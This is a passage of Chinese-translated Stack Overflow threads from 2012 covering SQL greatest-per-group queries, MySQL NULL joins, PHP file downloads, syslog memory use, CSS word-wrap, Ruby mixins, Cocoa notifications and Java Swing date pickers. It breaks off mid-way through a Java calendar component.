> 时间：2012-08-02T06:28:04.607

您需要做的就是用 any() 包装您的原始代码

```
>> any(strcmpi({'tif','jpg'},'jpg'))

ans =

     1

>> any(strcmpi({'tif','jpg'},'bmp'))

ans =

    0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T11:08:42.550

我现在使用 find 解决了它：

```
 [~, ~, ext] = fileparts(imageFile);
    ext = strrep(ext, '.', '');
    listOfValidExt = {'tif'; 'jpg'};
    indices = find(cellfun(@(x) strcmp(x,ext), listOfValidExt), 1);
    if ~isempty(indices)
    ... 
```

# sql - 如何从postgresql中的sql结果中获得最大的结果

> ID：11736849
> 
> 赞同：2
> 
> 时间：2012-07-31T09:18:35.037
> 
> 标签：sql, postgresql, group-by, distinct-on

我正在使用 postgresql 8.3，我有一个简单的 sql 查询：

```
SELECT a.id,a.bpm_process_instance_id,a.actor_id 
  FROM bpm_task_instance a
 WHERE a.bpm_process_instance_id IN 
(
   SELECT bpm_process_instance_id 
         FROM incident_info 
        WHERE status = 12
          AND registrant = 23
) 
```

所以，我得到了这样的结果集：

```
id    instance_id  actor_id
150     53            24
147     53            26
148     53            25
161     57            26
160     57            26
158     57            24
165     58            23
166     58            24
167     58            24 
```

现在，我想通过instance_id获取最大id，结果就像自爆

```
id    instance_id  actor_id
150     53            24
161     57            26
167     58            23 
```

我怎么能得到结果？我使用以下 sql，但出现错误。

错误：关系“x”不存在

```
SELECT * 
  FROM (SELECT a.id,a.bpm_process_instance_id,a.actor_id 
          FROM bpm_task_instance a
         WHERE a.bpm_process_instance_id IN
            (
               SELECT bpm_process_instance_id 
                     FROM incident_info
                        WHERE status = 12
                      AND registrant = 23
            ) 
     ) AS x
 WHERE x.id = (
       SELECT max(id)
             FROM x 
            WHERE bpm_process_instance_id = x.bpm_process_instance_id
          ) 
```

任何可以帮助我的人，非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:26:13.357

尝试这个：

```
select a.id,a.bpm_process_instance_id,a.actor_id 
from bpm_task_instance A 
inner join
    (select max(a.id) as id,a.bpm_process_instance_id
    from bpm_task_instance a 
    where a.bpm_process_instance_id in 
        (  select bpm_process_instance_id 
           from incident_info 
           where status = 12 and registrant = 23
        )
group by a.bpm_process_instance_id)B
on A.bpm_process_instance_id=B.bpm_process_instance_id
and A.id=B.id 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:45:08.957

```
DROP SCHEMA tmp CASCADE;
CREATE SCHEMA tmp ;
SET search_path=tmp;

CREATE TABLE the_table
        ( id INTEGER NOT NULL
        , instance_id INTEGER NOT NULL
        , actor_id INTEGER NOT NULL
        );
INSERT INTO the_table(id, instance_id, actor_id) VALUES
(150,53,24) ,(147,53,26) ,(148,53,25)
,(161,57,26) ,(160,57,26) ,(158,57,24)
,(165,58,23) ,(166,58,24) ,(167,58,24)
        ;

SELECT id, instance_id, actor_id
FROM the_table dt
WHERE NOT EXISTS (
        SELECT *
        FROM the_table nx
        WHERE nx.instance_id = dt.instance_id
        AND nx.id > dt.id
        ); 
```

结果（注意：最后一行不同！）：

```
DROP SCHEMA
CREATE SCHEMA
SET
CREATE TABLE
INSERT 0 9
 id  | instance_id | actor_id 
-----+-------------+----------
 150 |          53 |       24
 161 |          57 |       26
 167 |          58 |       24
(3 rows) 
```

更新：这是包含其他子查询和缺失表的查询，以及原始（丑陋的）列名，全部打包到 CTE 中：

```
WITH zcte AS (
        SELECT ti.id AS id
                , ti.bpm_process_instance_id AS instance_id
                , ti.actor_id AS actor_id
        FROM bpm_task_instance ti
        WHERE EXISTS ( SELECT * FROM incident_info ii
                WHERE ii.bpm_process_instance_id = ti.bpm_process_instance_id
                AND ii.status = 12
                AND ii.registrant = 23
                )
        )
SELECT id, instance_id, actor_id
FROM zcte dt
WHERE NOT EXISTS (
        SELECT *
        FROM zcte nx
        WHERE nx.instance_id = dt.instance_id
        AND nx.id > dt.id
        ); 
```

更新附录：

糟糕，坏消息是 8.3 还没有 CTE。（考虑升级）。好消息是：作为一种解决方法，您可以将 zcte () 作为（临时）视图，并改为引用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T10:11:23.900

@wildplasser

```
 SELECT dt.* FROM 
    (
       SELECT id,bpm_process_instance_id,actor_id 
       FROM bpm_task_instance WHERE bpm_process_instance_id in 
       (
           SELECT bpm_process_instance_id FROM incident_info 
           WHERE status = 12 and registrant = 23
       ) 
    ) as dt
    WHERE NOT EXISTS (
        SELECT *
        FROM bpm_task_instance nx
        WHERE nx.bpm_process_instance_id = dt.bpm_process_instance_id
        AND nx.id > dt.id
    )
   ORDER BY id asc 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T12:48:07.067

在大范围内，`DISTINCT ON`语法有时比已经给出的完全有效的答案更快。

```
SELECT DISTINCT ON (instance_id)
  id, instance_id, actor_id
  FROM the_table dt
  ORDER BY instance_id, id DESC; 
```

一旦习惯了这种语法，您可能会发现它比其他语法更容易阅读。在`DISTINCT ON`子句的括号内，您放置应该唯一的列列表，并且`ORDER BY`子句必须以匹配的列开头并继续使用足够的列以确保您要保留的列排在第一位。

# mysql - mysql选择包含最高值的记录，加入包含空值的列范围

> ID：11736854
> 
> 赞同：0
> 
> 时间：2012-07-31T09:18:57.643
> 
> 标签：mysql, join, distinct

这是我正在使用的：

```
CREATE TABLE IF NOT EXISTS `rate` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `client_company` int(11) DEFAULT NULL,
  `client_group` int(11) DEFAULT NULL,
  `client_contact` int(11) DEFAULT NULL,
  `role` int(11) DEFAULT NULL,
  `date_from` datetime DEFAULT NULL,
  `hourly_rate` decimal(18,2) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

INSERT INTO `rate` (`id`, `client_company`, `client_group`, 
                    `client_contact`, `role`, `date_from`, `hourly_rate`) 
VALUES
(4, NULL, NULL, NULL, 3, '2012-07-30 14:48:16', 115.00),
(5, 3, NULL, NULL, 3, '2012-07-30 14:51:38', 110.00),
(6, 3, NULL, NULL, 3, '2012-07-30 14:59:20', 112.00); 
```

此表存储客户的收费率；这个想法是，在寻找工作角色的正确费率时，我们首先寻找与给定角色和客户联系人匹配的费率，然后如果没有找到费率，将尝试匹配角色和客户组（或“部门”），然后是客户公司，最后只为角色本身寻找全球费率。美好的。

费率会随时间而变化，因此该表可能包含与角色、公司、组和客户联系人的任何给定组合匹配的多个条目：我想要一个查询，它只会返回每个不同组合的最新查询。

鉴于[我几天前问了一个几乎相同的问题](https://stackoverflow.com/questions/11614966/mysql-select-distinct-values-against-a-range-of-columns)，并且这个话题似乎以各种形式出现相当频繁，我只能为我的迟钝道歉，并再次要求有人解释为什么下面的查询会返回所有三个上面的记录，而不是我想要的，只有 ID 为 4 和 6 的记录。

这与我尝试基于包含 NULL 的列加入有关吗？

```
SELECT
    rate.*,
    newest.id
FROM rate
    LEFT JOIN rate AS newest ON(
        rate.client_company = newest.client_company
        AND rate.client_contact = newest.client_contact
        AND rate.client_group = newest.client_group
        AND rate.role= newest.role
        AND newest.date_from > rate.date_from
    )
WHERE newest.id IS NULL 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T13:24:25.657

FWIW，问题是加入 NULL 列。重要的缺失成分是 COALESCE：

```
SELECT
    rate.*,
    newest.id
FROM rate
    LEFT JOIN rate AS newest ON(
        COALESCE(rate.client_company,1) = COALESCE(newest.client_company,1)
        AND COALESCE(rate.client_contact,1) = COALESCE(newest.client_contact,1)
        AND COALESCE(rate.client_group,1) = COALESCE(newest.client_group,1)
        AND COALESCE(rate.role,1) = COALESCE(newest.role,1)
        AND newest.date_from > rate.date_from
    )
WHERE newest.id IS NULL 
```

# php - Web 应用程序帖子仅在登录时出现在公司页面

> ID：11736856
> 
> 赞同：0
> 
> 时间：2012-07-31T09:19:09.227
> 
> 标签：php, facebook-graph-api

我很快就厌倦了facebook。请有人可以向我解释为什么会发生以下情况。

1.  我有一个发布到用户提要的应用程序。
2.  我们已经建立了一个公司页面，这个页面已经安装了应用程序
3.  应用程序设置是：此应用程序可能会代表您发布，包括状态更新、照片等。
4.  该应用程序还具有以下设置：谁可以在您的 Facebook 时间线上看到此应用程序为您发布的帖子？每个人
5.  php页面发布到公司页面

那么为什么会发生以下情况（我要疯了！）

只有当我登录到 Facebook 帐户时，才会出现这些帖子。当我以普通用户身份访问该页面时，该帖子不可见。

现在，拥有公司页面并通过应用程序将内容发布到页面的目的是让访问者可以看到它。

该应用程序已安装。您可以在页面上发布更新，并且应用程序权限表示每个人都可以看到此应用程序发布的帖子。我只是愚蠢还是facebook API只是一堆废话？？？

# sql-server - SSRS BIDS Expression 根据广告组选择可见性

> ID：11736858
> 
> 赞同：4
> 
> 时间：2012-07-31T09:19:15.087
> 
> 标签：sql-server, sql-server-2008, ssrs-2008, reporting-services

我有一个带有“Dill Down Facility Available”文本的框（见截图）

运行报告时，我只希望某些人看到此框。

我想看到这个框的人包含在 19 个不同的广告组中

会有其他人运行它，但我需要他们查看黄色框之外的所有内容。

如果我右键单击该框并转到：TextBoxProperties > Visibility > Show or hide based on an expression，

我可以输入表达式。

我在屏幕截图中写的一个允许我选择 1 个人的 AD 名称，格式如下：

```
DOMAINNAME\ADNAME 
```

但是，如果我输入一个 ADGROUP 名称而不是 ADNAME，它就不起作用，而是每个人都可以看到黄色框。

由于表达式包含

```
User!UserID 
```

我相信这可能会阻止我的 ADGROUP 名称作为其寻找用户的工作，尽管这不能解释为什么它允许任何人看到这个框。

任何人都可以提供表达式以允许：

a) 1 个组名 b) 多个组名

谢谢。

![在此处输入图像描述](../Images/83e4bed2d1ca7be80c253cfddcd124ce.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T13:26:57.527

SSRS 没有内置此功能，您需要使用自定义程序集并在项目中引用它。

请参阅：http: [//support.microsoft.com/kb/920769](http://support.microsoft.com/kb/920769)

# php - PHP下载PDF引发错误

> ID：11736860
> 
> 赞同：0
> 
> 时间：2012-07-31T09:19:32.077
> 
> 标签：php, force-download

我有一个 PHP 文件来强制下载 PDF 文件，在一台服务器（linux）上它运行良好，但是当我将站点移动到另一台服务器（Win）时，它开始出现此错误：

```
PHP Warning:  readfile(./forms/Form.pdf)
[<a href='function.readfile'>function.readfile</a>]:
failed to open stream: No such file or directory in
D:\CustomerData\webspaces\webspace\wwwroot\Form.php
on line 4 
```

PHP文件有这个：

```
<?php
header('Content-disposition: attachment; filename=./forms/Form.pdf');
header('Content-type: application/pdf');
readfile('./forms/Form.pdf');
?> 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:55:50.333

尝试使用绝对文件位置。我认为这个错误是因为文件路径

试试下面的代码。

```
$file = <absolute file path>;
header('Content-Description: File Transfer');
header('Content-Type: application/pdf');
header('Content-Disposition: attachment; filename='.basename($file));
header('Content-Transfer-Encoding: binary');
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');
header('Content-Length: ' . filesize($file));
print_r(headers_list());
readfile($file); 
```

# xml - ePub 文件中的子章节

> ID：11736862
> 
> 赞同：2
> 
> 时间：2012-07-31T09:19:50.650
> 
> 标签：xml, epub

NCX 文件 ePub 文件可以指定具有 ePub 格式的书的章节。

它使用以下 XML 语法：

```
<navPoint class="chapter" id="chapter1" playOrder="1">
      <navLabel><text>Chapter 1</text></navLabel>
      <content src="file1.xhtml"/>
</navPoint> 
```

我的问题是，我们可以创建子章节吗？如果可以，如何创建？

我在 Google 上进行了搜索，发现的只是执行这些任务的非常具体的工具。我不需要工具，我想知道如何在 NCX 文件中制作子章节。

谢谢，

问候！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T07:59:27.187

将深度更改为级别数

```
<meta content="2" name="dtb:depth"/> 
```

在必须包含子级别的 navPoint 中放置一个 navPoint。记得关闭导航点！

```
<navPoint class="chapter" id="chapter1" playOrder="1">
      <navLabel><text>Chapter 1</text></navLabel>
      <content src="file1.xhtml"/>

  <navPoint class="subchapter" id="sub1" playOrder="2">
    <navLabel><text>Subchapter 1</text></navLabel>
    <content src="file2.xhtml"/>
  </navPoint>

</navPoint> 
```

# c - 写入 syslog 会导致堆分配的大小稳步增加

> ID：11736864
> 
> 赞同：3
> 
> 时间：2012-07-31T09:19:57.930
> 
> 标签：c, heap-memory, syslog

昨天我想知道为什么堆上的分配和释放的数量一直在攀升： [Valgrind 理解堆摘要中分配的字节数增加？](https://stackoverflow.com/questions/11730265/valgrind-understanding-bytes-allocated-increase-in-heap-summary)

今天我找到了罪魁祸首，但我不明白为什么：

```
openlog ("XYSV", LOG_PID, LOG_SYSLOG);
syslog (LOG_NOTICE, "server started by %s(%d) on port %d", getenv("USER"),getuid (),servPort);
closelog();

for (;;) /* Run forever */
{
    clntSock = AcceptTCPConnection(servSock);
    char ipstr[INET6_ADDRSTRLEN];

    /* Fork child process and report any errors */
    if ((processID = fork()) < 0)
        DieWithError("fork() failed");
    else if (processID == 0)  /* If this is the child process */
    {
        close(servSock);   /* Child closes parent socket */
        HandleTCPClient(clntSock);

        exit(0);           /* Child process terminates */
    }

    openlog ("XYSV", LOG_PID, LOG_SYSLOG);
    //syslog(LOG_INFO,"%d : created new child process for connect from %s\n", (int) processID,ipstr);
    //syslog(LOG_INFO, "test");
    closelog();

    close(clntSock);       /* Parent closes child socket descriptor */
    childProcCount++;      /* Increment number of outstanding child processes */    
} 
```

一旦我取消注释这两个系统日志条目，堆上的分配（由 Valgrind 报告）就会不断增加。allocs 也被释放，但是 allocs 的总数不断增加，因此分配的内存的大小。恕我直言，这迟早会导致服务器用完内存。

我的问题是：为什么写入系统日志会导致分配增加。我很好地关闭了系统日志。第一个 syslog 对堆分配没有影响。当我为第二次写入系统日志而将打开和关闭位置保留并留下实际写入注释时，一切都很好。一旦我取消注释一两行 syslog 行，allocs 就会开始爬升。

我一定在监督一些明显的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:43:36.357

`syslog`如果消息大于其本地缓冲区，则调用将分配内存以在传递日志消息之前保存它。

它实际上写入`FILE *`由调用创建的 a `open_memstream`，这是一个 C 文件流，它实际上使用了一个根据需要自动增长的缓冲区。然后它获取缓冲区并将其内容发送到记录器。

来源在[这里](http://sourceware.org/git/?p=glibc.git;a=blob_plain;f=misc/syslog.c;hb=HEAD)。

# jakarta-ee - 在 weblogic 上禁用 T3

> ID：11736865
> 
> 赞同：3
> 
> 时间：2012-07-31T09:20:07.130
> 
> 标签：jakarta-ee, weblogic

我想知道如何**在 weblogic Server 上禁用 T3 服务**。我环顾四周，但没有找到任何关于此的文档。

如果有人能指出一些解决方案，那将会很有帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-11-17T06:08:55.433

你不能禁用它。但是你可以做两件事：

1.  设置[连接过滤](https://docs.oracle.com/cd/E24329_01/web.1211/e24485/con_filtr.htm#SCPRG377 "网络逻辑 12")以阻止 t3 和 t3s
2.  更改默认端口号并在默认端口上创建一个新的 http- only[通道](https://docs.oracle.com/cd/E24329_01/web.1211/e24432/network.htm#CNFGD180)

# cocoa - Cocoa 版本浏览器：全屏

> ID：11736868
> 
> 赞同：0
> 
> 时间：2012-07-31T09:20:10.453
> 
> 标签：cocoa, fullscreen, versions, autosave

我的基于文档的应用程序处于版本浏览模式时出现问题。

似乎虽然版本浏览 UI 填满了整个主屏幕，但辅助屏幕并没有变黑（如 TextEdit 和 Pages 等其他应用程序的版本浏览器），并且启用了“Hot Corners”（与 TextEdit 和 Pages 不同）在版本浏览模式下禁用“热点”）。

知道为什么我的应用程序中的版本浏览器的行为不像 Pages 的版本浏览器我应该明确地做任何事情来禁用热角并使版本浏览器中的辅助屏幕变暗吗？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:35:27.127

找到了答案：当我的应用程序不是从 Xcode 运行时，它的行为与 Pages 和 TextEdit 相同。

无论如何，如果有人对如何禁用“热角”和其他在进程之间移动的操作感兴趣，[这里是答案](https://stackoverflow.com/questions/8941449/disabling-mission-control-spaces-dashboard-and-any-other-external-process)，它链接到[这里](https://developer.apple.com/library/mac/#documentation/General/Reference/InfoPlistKeyReference/Articles/LaunchServicesKeys.html)。

# html - HTML 自动换行不起作用？

> ID：11736870
> 
> 赞同：5
> 
> 时间：2012-07-31T09:20:14.263
> 
> 标签：html, css, enter

我声明了`width`，`margins`但不知何故我的台词没有被自动换行符包裹。

![在此处输入图像描述](../Images/5dcbc46f7c82e0bc5cfdc473ec7b45ec.png)

编辑：我找到了原因。这是因为单词之间没有空格：

```
teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp;teest&nbsp; 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-31T09:24:51.690

文本所在的元素应该有 css 声明：

```
div {
    display: block;
    width: 200px; /*based on how much width this div should have*/
} 
```

如果它不起作用，请尝试这样做：

```
div { word-wrap: break-word } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-24T01:59:32.350

一个一个试试这个，它一定对某些情况有帮助：

```
p{
    display: block; /* or inline-block, at least its a block element */
    width: 100px; /* or width is certain by parent element */
    height: auto; /* height cannot be defined */
    word-break: break-all; /*  */
    word-wrap: break-word; /* if you want to cut the complete word */
    white-space: normal; /* be sure its not 'nowrap'! ! ! :/ */
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-02-04T11:02:16.060

这将打印每行中的每个句子，没有`<br>`

```
<p style="font-family:courier;white-space: pre;">
First Line
Second Line
Third Line
</p> 
```

例如检查 jsfiddle [http://jsfiddle.net/muthupandiant/sgp8rjfs/](http://jsfiddle.net/muthupandiant/sgp8rjfs/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T13:40:07.263

真正的问题是：你到底为什么要使用在你的情况下？

每个空间是 6 个字节而不是 1 个字节！

除了浪费存储空间和文件大小外，搜索引擎还会试图理解它。

无论您出于何种原因必须使用* ，我都会选择退出。*并选择简单的空间（“”），对于 SEO 和 - 更重要的是 - 更少浪费的空间。这样，您将实现相同的目标，但向网站访问者提供较小的下载量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T09:34:11.967

```
 Try with `word-wrap` 

     #id
         { 
           word-wrap: break-word ;/*Allows unbreakable words to be broken*/
         } 

     #id
        { 
          word-wrap: normal ;/*Break words only at allowed break points*/
        } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-01-29T02:19:34.763

另一种方法是：

```
white-space: pre-wrap; // preserve whitespace, the text is wrapped
overflow-wrap: break-word; // text is wrapped, line break on the end of a word 
```

# ruby - 从扩展模块调用基类方法的奇怪输出

> ID：11736872
> 
> 赞同：0
> 
> 时间：2012-07-31T09:20:24.513
> 
> 标签：ruby, module, mixins

我想要实现的是如下所示，即从扩展模块方法调用基类方法：

```
class BaseClass
  def behavior
    puts 'base class behavior'
  end
end

module ChildModule
  def behavior
   super.behavior
   puts 'child module behavior'
  end
end

o = BaseClass.new
o.extend ChildModule
o.behavior 
```

它输出如下（使用 ruby​​ 1.9.2p290（2011-07-09 修订版 32553）[x86_64-linux]）

```
base class behavior
t.rb:9:in `behavior': undefined method `behavior' for nil:NilClass (NoMethodError)
       from t.rb:16:in `<main>' 
```

我的猜测是我不能使用`super`，因为`super`模块中不存在。但是它从方法中打印出那行`super`，这很奇怪吗？

我如何实现上面想要的？

@davidrac 的回答正在工作，但是更好奇，想知道，我怎样才能获得基类实例的句柄？例如，我将以下方法添加到 BaseClass

```
def behavior2
  puts 'base class behavior2'
end 
```

并在 ChildModule 中覆盖它。现在我可以从 ChildModule 行为调用 BaseModule 的 behavior2 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:22:19.407

我认为正确的语法是：

```
module ChildModule
  def behavior
   super
   puts 'child module behavior'
  end
end 
```

# cocoa - 如何构建在 Mac OS 10.6 上运行并支持 NSUserNotificationCenter 的应用程序？

> ID：11736877
> 
> 赞同：10
> 
> 时间：2012-07-31T09:20:39.273
> 
> 标签：cocoa, osx-mountain-lion

我做了很多研究，但找不到我要找的东西：目前，我的应用程序的`Deployment Target`和`Base SDK`都设置为`10.8`，并且运行良好。我可以正确地将通知发布到 Mountain Lions 的新通知中心！

为了构建一个也可以在 Mac OS 下运行的应用程序`10.6`，我将部署目标设置为 10.6 并构建了它（[如本线程中所建议的那样](https://stackoverflow.com/questions/11464719/what-base-sdk-level-should-i-use?answertab=active#tab-top)）。不幸的是，该应用程序在 10.6 上崩溃，并且崩溃报告详细说明找不到 NSUserNotificationCenter（无操作系统版本处理）。

--

所以我肯定要做的是检查 NSUserNotificationCenter 类是否存在：

```
notificationCenterIsAvailable = (NSClassFromString(@"NSUserNotificationCenter")!=nil); 
```

并基于此布尔标志进行操作。

但是不能基于这个标志的代码呢，比如：

*   界面`..: <NSUserNotificationCenterDelegate> {`
*   或对通知中心的引用类型：`NSUserNotificationCenter *center`在类的属性中？

我的第一个想法是在运行时动态更改类头，即根据类是否存在添加方法和属性来处理通知中心，但这看起来真的很复杂？！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:26:10.813

这些是编译问题，并且在 Base SDK 为 10.8 时一直很好。如果不存在，指针可以保持不变，因此您可以将其用作标志来检查您是否正在执行`center`通知*或*不在测试后运行的代码中。`nil``NSUserNotificationCenter`

 ***编辑**事实上离开它`nil`意味着你甚至不需要检查它；只需像往常一样发送消息，如果指针是，它们将被忽略`nil`（除非创建消息的成本很高，并且您想节省一些 CPU 周期）。*

# java - 在java中显示日历以选择日期

> ID：11736878
> 
> 赞同：10
> 
> 时间：2012-07-31T09:20:46.960
> 
> 标签：java, swing, date, calendar, jtable

在 VB、C# 等其他语言中，在您希望用户输入日期的情况下，例如在文本框中，我们可以使日历在您单击后出现。所以用户可以点击相应的日期，该日期将被放入文本框中。

通过这种方式，我们可以摆脱由于日期格式不正确而导致的问题。我需要知道我们如何在java中实现这一点？

实际上，我需要将它与 JTable 结合起来。有一列需要输入日期。但用户可以输入各种格式的日期。所以我想去这样的事情。希望有一种方法可以轻松地做到这一点。

谁能告诉我如何做到这一点。任何帮助是极大的赞赏..

谢谢你。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-03T04:46:25.470

我发现[JXDatePicker](https://java.net/projects/swingx/downloads/directory/releases)是一个更好的解决方案。它提供了您需要的东西并且非常易于使用。

> ```
> import java.text.SimpleDateFormat;
> import java.util.Calendar;
> import javax.swing.JFrame;
> import javax.swing.JPanel;
> import org.jdesktop.swingx.JXDatePicker;
> 
> public class DatePickerExample extends JPanel {
> 
>     public static void main(String[] args) {
>         JFrame frame = new JFrame("JXPicker Example");
>         JPanel panel = new JPanel();
> 
>         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
>         frame.setBounds(400, 400, 250, 100);
> 
>         JXDatePicker picker = new JXDatePicker();
>         picker.setDate(Calendar.getInstance().getTime());
>         picker.setFormats(new SimpleDateFormat("dd.MM.yyyy"));
> 
>         panel.add(picker);
>         frame.getContentPane().add(panel);
> 
>         frame.setVisible(true);
>     }
> } 
> ```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-07-31T11:24:53.843

我写了一个 DateTextField 组件。

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Cursor;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Frame;
import java.awt.GridLayout;
import java.awt.Point;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.SpinnerNumberModel;
import javax.swing.SwingConstants;
import javax.swing.SwingUtilities;
import javax.swing.border.LineBorder;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

public class DateTextField extends JTextField {

    private static String DEFAULT_DATE_FORMAT = "MM/dd/yyyy";
    private static final int DIALOG_WIDTH = 200;
    private static final int DIALOG_HEIGHT = 200;

    private SimpleDateFormat dateFormat;
    private DatePanel datePanel = null;
    private JDialog dateDialog = null;

    public DateTextField() {
        this(new Date());
    }

    public DateTextField(String dateFormatPattern, Date date) {
        this(date);
        DEFAULT_DATE_FORMAT = dateFormatPattern;
    }

    public DateTextField(Date date) {
        setDate(date);
        setEditable(false);
        setCursor(new Cursor(Cursor.HAND_CURSOR));
        addListeners();
    }

    private void addListeners() {
        addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent paramMouseEvent) {
                if (datePanel == null) {
                    datePanel = new DatePanel();
                }
                Point point = getLocationOnScreen();
                point.y = point.y + 30;
                showDateDialog(datePanel, point);
            }
        });
    }

    private void showDateDialog(DatePanel dateChooser, Point position) {
        Frame owner = (Frame) SwingUtilities
                .getWindowAncestor(DateTextField.this);
        if (dateDialog == null || dateDialog.getOwner() != owner) {
            dateDialog = createDateDialog(owner, dateChooser);
        }
        dateDialog.setLocation(getAppropriateLocation(owner, position));
        dateDialog.setVisible(true);
    }

    private JDialog createDateDialog(Frame owner, JPanel contentPanel) {
        JDialog dialog = new JDialog(owner, "Date Selected", true);
        dialog.setUndecorated(true);
        dialog.getContentPane().add(contentPanel, BorderLayout.CENTER);
        dialog.pack();
        dialog.setSize(DIALOG_WIDTH, DIALOG_HEIGHT);
        return dialog;
    }

    private Point getAppropriateLocation(Frame owner, Point position) {
        Point result = new Point(position);
        Point p = owner.getLocation();
        int offsetX = (position.x + DIALOG_WIDTH) - (p.x + owner.getWidth());
        int offsetY = (position.y + DIALOG_HEIGHT) - (p.y + owner.getHeight());

        if (offsetX > 0) {
            result.x -= offsetX;
        }

        if (offsetY > 0) {
            result.y -= offsetY;
        }

        return result;
    }

    private SimpleDateFormat getDefaultDateFormat() {
        if (dateFormat == null) {
            dateFormat = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
        }
        return dateFormat;
    }

    public void setText(Date date) {
        setDate(date);
    }

    public void setDate(Date date) {
        super.setText(getDefaultDateFormat().format(date));
    }

    public Date getDate() {
        try {
            return getDefaultDateFormat().parse(getText());
        } catch (ParseException e) {
            return new Date();
        }
    }

    private class DatePanel extends JPanel implements ChangeListener {
        int startYear = 1980;
        int lastYear = 2050;

        Color backGroundColor = Color.gray;
        Color palletTableColor = Color.white;
        Color todayBackColor = Color.orange;
        Color weekFontColor = Color.blue;
        Color dateFontColor = Color.black;
        Color weekendFontColor = Color.red;

        Color controlLineColor = Color.pink;
        Color controlTextColor = Color.white;

        JSpinner yearSpin;
        JSpinner monthSpin;
        JButton[][] daysButton = new JButton[6][7];

        DatePanel() {
            setLayout(new BorderLayout());
            setBorder(new LineBorder(backGroundColor, 2));
            setBackground(backGroundColor);

            JPanel topYearAndMonth = createYearAndMonthPanal();
            add(topYearAndMonth, BorderLayout.NORTH);
            JPanel centerWeekAndDay = createWeekAndDayPanal();
            add(centerWeekAndDay, BorderLayout.CENTER);

            reflushWeekAndDay();
        }

        private JPanel createYearAndMonthPanal() {
            Calendar cal = getCalendar();
            int currentYear = cal.get(Calendar.YEAR);
            int currentMonth = cal.get(Calendar.MONTH) + 1;

            JPanel panel = new JPanel();
            panel.setLayout(new FlowLayout());
            panel.setBackground(controlLineColor);

            yearSpin = new JSpinner(new SpinnerNumberModel(currentYear,
                    startYear, lastYear, 1));
            yearSpin.setPreferredSize(new Dimension(56, 20));
            yearSpin.setName("Year");
            yearSpin.setEditor(new JSpinner.NumberEditor(yearSpin, "####"));
            yearSpin.addChangeListener(this);
            panel.add(yearSpin);

            JLabel yearLabel = new JLabel("Year");
            yearLabel.setForeground(controlTextColor);
            panel.add(yearLabel);

            monthSpin = new JSpinner(new SpinnerNumberModel(currentMonth, 1,
                    12, 1));
            monthSpin.setPreferredSize(new Dimension(35, 20));
            monthSpin.setName("Month");
            monthSpin.addChangeListener(this);
            panel.add(monthSpin);

            JLabel monthLabel = new JLabel("Month");
            monthLabel.setForeground(controlTextColor);
            panel.add(monthLabel);

            return panel;
        }

        private JPanel createWeekAndDayPanal() {
            String colname[] = { "S", "M", "T", "W", "T", "F", "S" };
            JPanel panel = new JPanel();
            panel.setFont(new Font("Arial", Font.PLAIN, 10));
            panel.setLayout(new GridLayout(7, 7));
            panel.setBackground(Color.white);

            for (int i = 0; i < 7; i++) {
                JLabel cell = new JLabel(colname[i]);
                cell.setHorizontalAlignment(JLabel.RIGHT);
                if (i == 0 || i == 6) {
                    cell.setForeground(weekendFontColor);
                } else {
                    cell.setForeground(weekFontColor);
                }
                panel.add(cell);
            }

            int actionCommandId = 0;
            for (int i = 0; i < 6; i++)
                for (int j = 0; j < 7; j++) {
                    JButton numBtn = new JButton();
                    numBtn.setBorder(null);
                    numBtn.setHorizontalAlignment(SwingConstants.RIGHT);
                    numBtn.setActionCommand(String
                            .valueOf(actionCommandId));
